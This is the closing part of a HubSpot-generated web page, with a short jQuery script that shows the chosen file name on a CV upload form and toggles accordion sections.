<script defer src="/hs/hsstatic/HubspotToolsMenu/static-1.393/js/index.js"></script>

<script>
  

  
 $(document).ready(function(){
   
   setTimeout(function() { 
        $('.send_your_cv .hs_upload .hs-input').change(function() {
    
        var filepath = this.value;
        var m = filepath.match(/([^\/\\]+)$/);
        var filename = m[1];
        $('.send_your_cv .hs_upload label').html(filename);
    });
   
    }, 2000);
              
  const items = document.querySelectorAll('.accordion button');

function toggleAccordion() {
  const itemToggle = this.getAttribute('aria-expanded');

  for (i = 0; i < items.length; i++) {
    items[i].setAttribute('aria-expanded', 'false');
  }

  if (itemToggle == 'false') {
    this.setAttribute('aria-expanded', 'true');
  }
}

items.forEach((item) => item.addEventListener('click', toggleAccordion));




   
});

</script>



    <!-- Generated by the HubSpot Template Builder - template version 1.03 -->

</body></html>